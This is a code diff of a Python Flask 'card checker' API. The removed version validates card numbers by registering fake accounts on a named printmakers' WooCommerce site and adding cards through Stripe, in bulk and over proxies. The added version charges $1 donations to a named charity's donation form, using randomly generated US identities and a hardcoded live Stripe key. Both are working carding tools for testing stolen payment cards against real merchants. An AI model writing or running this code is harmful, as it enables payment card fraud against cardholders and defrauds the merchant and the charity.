@@ -1,504 +1,296 @@
-from flask import Flask, request, jsonify
-import asyncio
-import re
+import requests
 import json
 import random
-import aiohttp
-from datetime import datetime
-import uuid
-import warnings
-from fake_useragent import UserAgent
-
-warnings.filterwarnings('ignore')
+import re
+import os
+import time
+from flask import Flask, request, jsonify
+from typing import Dict, Optional
 
 app = Flask(__name__)
 
-# ────────────────────────── helper functions ──────────────────────────
-
-def gets(s, start, end):
-    try:
-        start_index = s.index(start) + len(start)
-        end_index = s.index(end, start_index)
-        return s[start_index:end_index]
-    except (ValueError, AttributeError):
-        return None
-
-def generate_random_email():
-    import string
-    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
-    number = random.randint(100, 9999)
-    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
-    return f"{username}{number}@{random.choice(domains)}"
-
-def generate_guid():
-    return str(uuid.uuid4())
-
-def parse_proxy_line(line: str) -> str or None:
-    line = line.strip()
-    if not line:
-        return None
-    protocol = 'http'
-    if '://' in line:
-        protocol, rest = line.split('://', 1)
-    else:
-        rest = line
-    auth = None
-    address = None
-    if '@' in rest:
-        left, right = rest.split('@', 1)
-        if ':' in left and ':' not in right:
-            auth = left
-            address = right
-        elif ':' in right and ':' not in left:
-            address = left
-            auth = right
-        else:
-            auth = left
-            address = right
-    else:
-        parts = rest.split(':')
-        if len(parts) == 2:
-            host, port = parts
-            address = f"{host}:{port}"
-        elif len(parts) == 4:
-            host, port, user, pwd = parts
-            auth = f"{user}:{pwd}"
-            address = f"{host}:{port}"
-        else:
-            return None
-    if auth:
-        proxy_url = f"{protocol}://{auth}@{address}"
-    else:
-        proxy_url = f"{protocol}://{address}"
-    return proxy_url
-
-# ──────────────────────── stripe auth logic ──────────────────────────
-
-async def process_stripe_card(card_data, proxy_url=None):
-    ua = UserAgent()
-    site_url = 'https://www.eastlondonprintmakers.co.uk/my-account/add-payment-method/'
-    try:
-        if not site_url.startswith('http'):
-            site_url = 'https://' + site_url
-        timeout = aiohttp.ClientTimeout(total=70)
-        connector = aiohttp.TCPConnector(ssl=False)
-        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
-            from urllib.parse import urlparse
-            parsed = urlparse(site_url)
-            domain = f"{parsed.scheme}://{parsed.netloc}"
-            email = generate_random_email()
-            headers = {
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                'user-agent': ua.random
-            }
-            resp = await session.get(site_url, headers=headers, proxy=proxy_url)
-            resp_text = await resp.text()
-            register_nonce = (gets(resp_text, 'woocommerce-register-nonce" value="', '"') or 
-                             gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or 
-                             gets(resp_text, 'name="woocommerce-register-nonce" value="', '"'))
-            if register_nonce:
-                username = email.split('@')[0]
-                password = f"Pass{random.randint(100000, 999999)}!"
-                register_data = {
-                    'email': email,
-                    'wc_order_attribution_source_type': 'typein',
-                    'wc_order_attribution_referrer': '(none)',
-                    'wc_order_attribution_utm_campaign': '(none)',
-                    'wc_order_attribution_utm_source': '(direct)',
-                    'wc_order_attribution_utm_medium': '(none)',
-                    'wc_order_attribution_utm_content': '(none)',
-                    'wc_order_attribution_utm_id': '(none)',
-                    'wc_order_attribution_utm_term': '(none)',
-                    'wc_order_attribution_utm_source_platform': '(none)',
-                    'wc_order_attribution_utm_creative_format': '(none)',
-                    'wc_order_attribution_utm_marketing_tactic': '(none)',
-                    'wc_order_attribution_session_entry': site_url,
-                    'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-                    'wc_order_attribution_session_pages': '1',
-                    'wc_order_attribution_session_count': '1',
-                    'wc_order_attribution_user_agent': headers['user-agent'],
-                    'woocommerce-register-nonce': register_nonce,
-                    '_wp_http_referer': '/my-account/',
-                    'register': 'Register'
-                }
-                reg_resp = await session.post(site_url, headers=headers, data=register_data, proxy=proxy_url)
-                reg_text = await reg_resp.text()
-                if 'customer-logout' not in reg_text and 'dashboard' not in reg_text.lower():
-                    resp = await session.get(site_url, headers=headers, proxy=proxy_url)
-                    resp_text = await resp.text()
-                    login_nonce = gets(resp_text, 'woocommerce-login-nonce" value="', '"')
-                    if login_nonce:
-                        login_data = {
-                            'username': username,
-                            'password': password,
-                            'woocommerce-login-nonce': login_nonce,
-                            'login': 'Log in'
-                        }
-                        await session.post(site_url, headers=headers, data=login_data, proxy=proxy_url)
-            add_payment_url = site_url.rstrip('/') + '/add-payment-method/'
-            if '/my-account/add-payment-method' not in add_payment_url:
-                add_payment_url = f"{domain}/my-account/add-payment-method/"
-            headers = {'user-agent': ua.random}
-            resp = await session.get(add_payment_url, headers=headers, proxy=proxy_url)
-            payment_page_text = await resp.text()
-            add_card_nonce = (gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or 
-                             gets(payment_page_text, 'add_card_nonce":"', '"') or 
-                             gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or 
-                             gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"'))
-            stripe_key = (gets(payment_page_text, '"key":"pk_', '"') or 
-                         gets(payment_page_text, 'data-key="pk_', '"') or 
-                         gets(payment_page_text, 'stripe_key":"pk_', '"') or 
-                         gets(payment_page_text, 'publishable_key":"pk_', '"'))
-            if not stripe_key:
-                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
-                if pk_match:
-                    stripe_key = pk_match.group(0)
-            if not stripe_key:
-                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
-            elif not stripe_key.startswith('pk_'):
-                stripe_key = 'pk_' + stripe_key
-            stripe_headers = {
-                'accept': 'application/json',
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://js.stripe.com',
-                'referer': 'https://js.stripe.com/',
-                'user-agent': ua.random
-            }
-            stripe_data = {
-                'type': 'card',
-                'card[number]': card_data['number'],
-                'card[cvc]': card_data['cvc'],
-                'card[exp_month]': card_data['exp_month'],
-                'card[exp_year]': card_data['exp_year'],
-                'allow_redisplay': 'unspecified',
-                'billing_details[address][country]': 'AU',
-                'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
-                'referrer': domain,
-                'client_attribution_metadata[client_session_id]': generate_guid(),
-                'client_attribution_metadata[merchant_integration_source]': 'elements',
-                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
-                'client_attribution_metadata[merchant_integration_version]': '2021',
-                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
-                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
-                'client_attribution_metadata[elements_session_config_id]': generate_guid(),
-                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
-                'guid': generate_guid(),
-                'muid': generate_guid(),
-                'sid': generate_guid(),
-                'key': stripe_key,
-                '_stripe_version': '2024-06-20'
-            }
-            pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy_url)
-            pm_json = await pm_resp.json()
-            if 'error' in pm_json:
-                return False, pm_json['error']['message']
-            pm_id = pm_json.get('id')
-            if not pm_id:
-                return False, 'Failed to create Payment Method'
-            confirm_headers = {
-                'accept': 'application/json, text/javascript, */*; q=0.01',
-                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'origin': domain,
-                'x-requested-with': 'XMLHttpRequest',
-                'user-agent': ua.random
-            }
-            endpoints = [
-                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 'data': {'wc-stripe-payment-method': pm_id}},
-                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
-                {'url': f"{domain}/?wc-ajax=add_payment_method", 'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}}
-            ]
-            for endp in endpoints:
-                if not add_card_nonce:
-                    continue
-                if 'add_payment_method' in endp['url']:
-                    endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
-                else:
-                    endp['data']['_ajax_nonce'] = add_card_nonce
-                endp['data']['wc-stripe-payment-type'] = 'card'
-                try:
-                    res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers, proxy=proxy_url)
-                    text = await res.text()
-                    if 'success' in text:
-                        js = json.loads(text)
-                        if js.get('success'):
-                            status = js.get('data', {}).get('status')
-                            return True, f"Approved (Status: {status})"
-                        else:
-                            error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
-                            return False, error_msg
-                except:
-                    continue
-            return False, 'Confirmation failed on site'
-    except Exception as e:
-        return False, f'System Error: {str(e)}'
-
-# ─────────────────────── single card check ───────────────────────────
-
-async def check_card(cc, mes, ano, cvv, proxy=None):
-    card_data = {'number': cc, 'exp_month': mes, 'exp_year': ano, 'cvc': cvv}
-    is_approved, response_msg = await process_stripe_card(card_data, proxy_url=proxy)
-    response_lower = response_msg.lower()
-    if 'requires_action' in response_lower or 'succeeded' in response_lower:
-        status = 'Approved'
-        is_live = True
-    elif is_approved:
-        status = 'Approved'
-        is_live = True
-    else:
-        status = 'Declined'
-        is_live = False
-    return {
-        'cc': f"{cc}|{mes}|{ano}|{cvv}",
-        'status': status,
-        'response': response_msg,
-        'is_live': is_live
-    }
-
-# ──────────────────────── Helper to run async code ──────────────────────────
-
-def run_async(coro):
-    """Run async coroutine in a new event loop"""
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    try:
-        return loop.run_until_complete(coro)
-    finally:
-        loop.close()
-
-# ──────────────────────── Single API Endpoint ──────────────────────────────
-
-@app.route('/check/', methods=['GET', 'POST'])
-def check_api():
-    """
-    Single endpoint for both single and mass card checking
-    GET: Single card check
-    POST: Single or mass card check
+class USAddressGenerator:
+    LOCATIONS = [
+        {"city": "New York", "state": "NY", "zip": "10001", "state_full": "New York"},
+        {"city": "Los Angeles", "state": "CA", "zip": "90001", "state_full": "California"},
+        {"city": "Chicago", "state": "IL", "zip": "60601", "state_full": "Illinois"},
+        {"city": "Houston", "state": "TX", "zip": "77001", "state_full": "Texas"},
+        {"city": "Phoenix", "state": "AZ", "zip": "85001", "state_full": "Arizona"},
+        {"city": "Philadelphia", "state": "PA", "zip": "19019", "state_full": "Pennsylvania"},
+        {"city": "San Antonio", "state": "TX", "zip": "78201", "state_full": "Texas"},
+        {"city": "San Diego", "state": "CA", "zip": "92101", "state_full": "California"},
+        {"city": "Dallas", "state": "TX", "zip": "75201", "state_full": "Texas"},
+        {"city": "Austin", "state": "TX", "zip": "78701", "state_full": "Texas"},
+    ]
     
-    GET: /check/?cc=5129925506260283|02|2028|384&proxy=http://user:pass@proxy:port
+    FIRST_NAMES = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth", "David", "Barbara", "Richard", "Susan", "Joseph", "Jessica", "Thomas", "Sarah", "Charles", "Karen"]
+    LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin"]
+    STREETS = ["Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Pine St", "Elm St", "Washington Ave", "Lake St", "Hill St", "Park Ave"]
     
-    POST: 
-    {
-        "cards": [
-            "5129925506260283|02|2028|384",
-            "4111111111111111|12|2026|123"
-        ],
-        "proxy": "http://user:pass@proxy:port",
-        "concurrency": 10
-    }
-    """
-    
-    # ────── GET Request - Single Card ──────
-    if request.method == 'GET':
-        cc_param = request.args.get('cc')
-        proxy_param = request.args.get('proxy', '')
+    @classmethod
+    def generate_address(cls) -> Dict[str, str]:
+        location = random.choice(cls.LOCATIONS)
+        street_num = random.randint(100, 9999)
+        street = random.choice(cls.STREETS)
         
-        if not cc_param:
-            return jsonify({
-                'success': False,
-                'error': 'Missing cc parameter',
-                'format': '/check/?cc=cardnumber|month|year|cvv&proxy=proxy_url'
-            }), 400
-        
-        parts = cc_param.split('|')
-        if len(parts) != 4:
-            return jsonify({
-                'success': False,
-                'error': 'Invalid card format. Use: number|month|year|cvv'
-            }), 400
-        
-        cc, mes, ano, cvv = parts
-        
-        proxy = None
-        if proxy_param and proxy_param.strip():
-            proxy = parse_proxy_line(proxy_param)
-            if not proxy:
-                return jsonify({
-                    'success': False,
-                    'error': 'Invalid proxy format'
-                }), 400
-        
-        try:
-            result = run_async(check_card(cc, mes, ano, cvv, proxy=proxy))
-            return jsonify({
-                'success': True,
-                'type': 'single',
-                'card': result['cc'],
-                'status': result['status'],
-                'response': result['response'],
-                'is_live': result['is_live']
-            })
-        except Exception as e:
-            return jsonify({
-                'success': False,
-                'error': f'System error: {str(e)}'
-            }), 500
-    
-    # ────── POST Request - Single or Mass ──────
-    else:
-        data = request.get_json()
-        if not data:
-            return jsonify({
-                'success': False,
-                'error': 'Missing JSON body'
-            }), 400
-        
-        cards_data = data.get('cards')
-        proxy_param = data.get('proxy', '')
-        concurrency_param = data.get('concurrency', 10)
-        
-        # If single card provided as string
-        if isinstance(cards_data, str):
-            cards_data = [cards_data]
-        
-        if not cards_data:
-            return jsonify({
-                'success': False,
-                'error': 'Missing cards array in JSON',
-                'format': {
-                    'cards': ['cardnumber|month|year|cvv', 'cardnumber|month|year|cvv'],
-                    'proxy': 'http://user:pass@proxy:port (optional)',
-                    'concurrency': 10
-                }
-            }), 400
-        
-        # Parse cards
-        cards = []
-        for card in cards_data:
-            if isinstance(card, str):
-                parts = card.split('|')
-                if len(parts) == 4:
-                    cards.append({
-                        'cc': parts[0],
-                        'mes': parts[1],
-                        'ano': parts[2],
-                        'cvv': parts[3]
-                    })
-            elif isinstance(card, dict):
-                if all(k in card for k in ['cc', 'mes', 'ano', 'cvv']):
-                    cards.append(card)
-        
-        if not cards:
-            return jsonify({
-                'success': False,
-                'error': 'No valid cards found'
-            }), 400
-        
-        # Parse concurrency
-        try:
-            concurrency = int(concurrency_param)
-            concurrency = min(concurrency, 50)
-        except:
-            concurrency = 10
-        
-        # Parse proxy
-        proxy = None
-        if proxy_param and proxy_param.strip():
-            proxy = parse_proxy_line(proxy_param)
-            if not proxy:
-                return jsonify({
-                    'success': False,
-                    'error': 'Invalid proxy format'
-                }), 400
-        
-        try:
-            # If only one card, return single format
-            if len(cards) == 1:
-                result = run_async(check_card(
-                    cards[0]['cc'], 
-                    cards[0]['mes'], 
-                    cards[0]['ano'], 
-                    cards[0]['cvv'], 
-                    proxy=proxy
-                ))
-                return jsonify({
-                    'success': True,
-                    'type': 'single',
-                    'card': result['cc'],
-                    'status': result['status'],
-                    'response': result['response'],
-                    'is_live': result['is_live']
-                })
-            
-            # Mass check
-            async def mass_check_async():
-                sem = asyncio.Semaphore(concurrency)
-                results = []
-                
-                async def worker(card_data):
-                    async with sem:
-                        result = await check_card(
-                            card_data['cc'], 
-                            card_data['mes'], 
-                            card_data['ano'], 
-                            card_data['cvv'], 
-                            proxy=proxy
-                        )
-                        return result
-                
-                tasks = [asyncio.create_task(worker(card)) for card in cards]
-                results = await asyncio.gather(*tasks)
-                return results
-            
-            results = run_async(mass_check_async())
-            
-            approved = sum(1 for r in results if r['is_live'])
-            declined = sum(1 for r in results if not r['is_live'])
-            
-            return jsonify({
-                'success': True,
-                'type': 'mass',
-                'total': len(results),
-                'approved': approved,
-                'declined': declined,
-                'results': results
-            })
-            
-        except Exception as e:
-            return jsonify({
-                'success': False,
-                'error': f'System error: {str(e)}'
-            }), 500
-
-@app.route('/health', methods=['GET'])
-def health_check():
-    """Health check endpoint"""
-    return jsonify({
-        'status': 'running',
-        'message': 'Stripe Card Checker API is operational'
-    })
-
-@app.route('/', methods=['GET'])
-def index():
-    """API information"""
-    return jsonify({
-        'name': 'Stripe Card Checker API',
-        'version': '3.0',
-        'endpoint': '/check/',
-        'methods': ['GET', 'POST'],
-        'usage': {
-            'GET': {
-                'params': {
-                    'cc': 'cardnumber|month|year|cvv (required)',
-                    'proxy': 'http://user:pass@proxy:port (optional)'
-                },
-                'example': '/check/?cc=5129925506260283|02|2028|384&proxy=http://user:pass@proxy:8080'
-            },
-            'POST': {
-                'body': {
-                    'cards': 'array of cards (required)',
-                    'proxy': 'http://user:pass@proxy:port (optional)',
-                    'concurrency': 'integer, default 10 (optional)'
-                },
-                'example': {
-                    'cards': ['5129925506260283|02|2028|384', '4111111111111111|12|2026|123'],
-                    'proxy': 'http://user:pass@proxy:8080',
-                    'concurrency': 10
-                }
-            }
+        return {
+            "first_name": random.choice(cls.FIRST_NAMES),
+            "last_name": random.choice(cls.LAST_NAMES),
+            "address": f"{street_num} {street}",
+            "address_2": random.choice(["", f"Apt {random.randint(1, 50)}", f"#{random.randint(1, 100)}", ""]),
+            "city": location["city"],
+            "state": location["state"],
+            "state_full": location["state_full"],
+            "zip": location["zip"],
+            "email": f"{random.choice(cls.FIRST_NAMES).lower()}{random.randint(1, 999)}@gmail.com"
         }
-    })
 
-# ──────────────────────── Main entry point ──────────────────────────
+class BravehoundDonationBot:
+    def __init__(self, card_data: str, proxy: Optional[str] = None):
+        parts = card_data.split('|')
+        if len(parts) != 4:
+            raise ValueError("Invalid card format. Expected: number|month|year|cvc")
+            
+        self.card_number = parts[0].strip()
+        self.exp_month = parts[1].strip()
+        self.exp_year = parts[2].strip()
+        self.cvc = parts[3].strip()
+        
+        self.session = requests.Session()
+        
+        if proxy:
+            proxy_dict = {
+                'http': proxy,
+                'https': proxy
+            }
+            self.session.proxies.update(proxy_dict)
+        
+        self.address = USAddressGenerator.generate_address()
+        self.form_hash = None
+        self.payment_method_id = None
+        
+    def get_form_hash(self):
+        url = "https://www.bravehound.co.uk/wp-admin/admin-ajax.php"
+        payload = {
+            'action': "give_donation_form_reset_all_nonce",
+            'give_form_id': "13302"
+        }
+        headers = {
+            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
+            'sec-ch-ua-platform': '"Android"',
+            'x-requested-with': "XMLHttpRequest",
+            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
+            'sec-ch-ua-mobile': "?1",
+            'origin': "https://www.bravehound.co.uk",
+            'sec-fetch-site': "same-origin",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-dest': "empty",
+            'referer': "https://www.bravehound.co.uk/donation/",
+            'accept-language': "en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5",
+            'priority': "u=1, i",
+        }
+        response = self.session.post(url, data=payload, headers=headers)
+        self.form_hash = response.json()['data']['give_form_hash']
+        return self.form_hash
+    
+    def create_payment_method(self):
+        url = "https://api.stripe.com/v1/payment_methods"
+        payload = {
+            'type': "card",
+            'billing_details[name]': f"{self.address['first_name']} {self.address['last_name']}",
+            'billing_details[email]': self.address['email'],
+            'card[number]': self.card_number,
+            'card[cvc]': self.cvc,
+            'card[exp_month]': self.exp_month,
+            'card[exp_year]': self.exp_year[-2:] if len(self.exp_year) > 2 else self.exp_year,
+            'guid': "c2d15411-4ea6-4412-96f9-5964b19feacc9a03e0",
+            'muid': "2cbebced-2e78-43c8-8df0-d77c88f32d7effd1d6",
+            'sid': "515d1b26-d906-4b1d-a218-e9cb37dbceebeed15b",
+            'payment_user_agent': "stripe.js/668d00c08a; stripe-js-v3/668d00c08a; split-card-element",
+            'referrer': "https://www.bravehound.co.uk",
+            'time_on_page': str(random.randint(30000, 50000)),
+            'client_attribution_metadata[client_session_id]': "63059f23-5d3b-4e7b-b77f-7c5d2fc5630d",
+            'client_attribution_metadata[merchant_integration_source]': "elements",
+            'client_attribution_metadata[merchant_integration_subtype]': "split-card-element",
+            'client_attribution_metadata[merchant_integration_version]': "2017",
+            'key': "pk_live_SMtnnvlq4TpJelMdklNha8iD",
+            '_stripe_account': "acct_1GZhGGEfZQ9gHa50",
+        }
+        headers = {
+            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
+            'Accept': "application/json",
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
+            'sec-ch-ua-mobile': "?1",
+            'origin': "https://js.stripe.com",
+            'sec-fetch-site': "same-site",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-dest': "empty",
+            'referer': "https://js.stripe.com/",
+            'accept-language': "en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5",
+            'priority': "u=1, i"
+        }
+        response = self.session.post(url, data=payload, headers=headers)
+        self.payment_method_id = response.json()['id']
+        return self.payment_method_id
+    
+    def submit_donation(self):
+        url = "https://www.bravehound.co.uk/donation/"
+        params = {
+            'payment-mode': "stripe",
+            'form-id': "13302"
+        }
+        payload = {
+            'give-honeypot': "",
+            'give-form-id-prefix': "13302-1",
+            'give-form-id': "13302",
+            'give-form-title': "Bravehound Donations",
+            'give-current-url': "https://www.bravehound.co.uk/donation/",
+            'give-form-url': "https://www.bravehound.co.uk/donation/",
+            'give-form-minimum': "1.00",
+            'give-form-maximum': "999999.99",
+            'give-form-hash': self.form_hash,
+            'give-price-id': "custom",
+            'give-recurring-logged-in-only': "",
+            'give-logged-in-only': "1",
+            '_give_is_donation_recurring': "0",
+            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
+            'give-amount': "1.00",
+            'give_stripe_payment_method': self.payment_method_id,
+            'payment-mode': "stripe",
+            'give_first': self.address['first_name'],
+            'give_last': self.address['last_name'],
+            'give_email': self.address['email'],
+            'card_name': f"{self.address['first_name']} {self.address['last_name']}",
+            'give_gift_check_is_billing_address': "yes",
+            'give_gift_aid_address_option': "billing_address",
+            'give_gift_aid_card_first_name': "",
+            'give_gift_aid_card_last_name': "",
+            'give_gift_aid_billing_country': "US",
+            'give_gift_aid_card_address': self.address['address'],
+            'give_gift_aid_card_address_2': self.address['address_2'],
+            'give_gift_aid_card_city': self.address['city'],
+            'give_gift_aid_card_state': self.address['state'],
+            'give_gift_aid_card_zip': self.address['zip'],
+            'give_action': "purchase",
+            'give-gateway': "stripe"
+        }
+        headers = {
+            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
+            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            'cache-control': "max-age=0",
+            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
+            'sec-ch-ua-mobile': "?1",
+            'sec-ch-ua-platform': '"Android"',
+            'origin': "https://www.bravehound.co.uk",
+            'upgrade-insecure-requests': "1",
+            'sec-fetch-site': "same-origin",
+            'sec-fetch-mode': "navigate",
+            'sec-fetch-user': "?1",
+            'sec-fetch-dest': "document",
+            'referer': "https://www.bravehound.co.uk/donation/?form-id=13302&payment-mode=stripe&level-id=custom&custom-amount=1.00",
+            'accept-language': "en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5",
+            'priority': "u=0, i",
+        }
+        response = self.session.post(url, params=params, data=payload, headers=headers)
+        return self._parse_response(response.text)
+    
+    def _parse_response(self, response_text):
+        error_match = re.search(r'<p>.*?<strong>Error</strong>:(.*?)<br', response_text, re.DOTALL)
+        if error_match:
+            error_msg = error_match.group(1).strip()
+            if "card" in error_msg.lower() or "declined" in error_msg.lower():
+                return {"status": "declined", "message": error_msg}
+            return {"status": "error", "message": error_msg}
+        elif re.search(r'(thank\s?you|successfully|succeeded|Your donation was successful)', response_text, re.I):
+            return {"status": "success", "message": "Charged $1.00 successfully"}
+        elif "card_declined" in response_text.lower() or "insufficient" in response_text.lower():
+            return {"status": "declined", "message": "Card declined"}
+        else:
+            return {"status": "unknown", "message": "Unknown Response"}
+    
+    def run(self):
+        try:
+            self.get_form_hash()
+            time.sleep(random.uniform(0.5, 2))
+            self.create_payment_method()
+            time.sleep(random.uniform(0.5, 2))
+            result = self.submit_donation()
+            result["card"] = self.card_number
+            result["address"] = f"{self.address['address']}, {self.address['city']}, {self.address['state']} {self.address['zip']}"
+            return result
+        except Exception as e:
+            return {
+                "status": "error",
+                "message": str(e),
+                "card": self.card_number,
+                "address": f"{self.address['address']}, {self.address['city']}, {self.address['state']} {self.address['zip']}"
+            }
+
+def parse_cc_string(cc_string):
+    """Parse CC string in format CC|MM|YYYY|CVV"""
+    parts = cc_string.split('|')
+    if len(parts) != 4:
+        raise ValueError("Invalid format. Expected: CC|MM|YYYY|CVV")
+    
+    return {
+        'cc': parts[0].strip(),
+        'mes': parts[1].strip(),
+        'ano': parts[2].strip(),
+        'cvv': parts[3].strip()
+    }
+
+@app.route('/check', methods=['GET'])
+def bravehound_checker():
+    """
+    Check credit card with Bravehound donation
+    GET Parameters:
+        - cc: Required. Format: CC|MM|YYYY|CVV
+        - proxy: Optional. Proxy string (e.g., http://user:pass@ip:port)
+    """
+    try:
+        cc_string = request.args.get('cc')
+        proxy_str = request.args.get('proxy')
+        
+        if not cc_string:
+            return jsonify({
+                "error": "Missing 'cc' parameter. Format: CC|MM|YYYY|CVV",
+                "status": False
+            }), 400
+        
+        try:
+            cc_parts = parse_cc_string(cc_string)
+            formatted_card = f"{cc_parts['cc']}|{cc_parts['mes']}|{cc_parts['ano']}|{cc_parts['cvv']}"
+        except ValueError as e:
+            return jsonify({
+                "error": str(e),
+                "status": False
+            }), 400
+        
+        bot = BravehoundDonationBot(formatted_card, proxy_str)
+        result = bot.run()
+        
+        response_data = {
+            "Gateway": "Stripe (Bravehound)",
+            "Price": 1.00,
+            "Response": result.get('message', 'Unknown'),
+            "Status": result.get('status') == 'success',
+            "StatusDetail": result.get('status', 'unknown'),
+            "cc": cc_string,
+            "address_used": result.get('address', 'N/A')
+        }
+        
+        return jsonify(response_data)
+        
+    except Exception as e:
+        return jsonify({
+            "error": str(e),
+            "status": False,
+            "Gateway": "Stripe (Bravehound)",
+            "Price": 1.00,
+            "Response": f"ERROR: {str(e)}",
+            "cc": request.args.get('cc', '')
+        }), 500
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
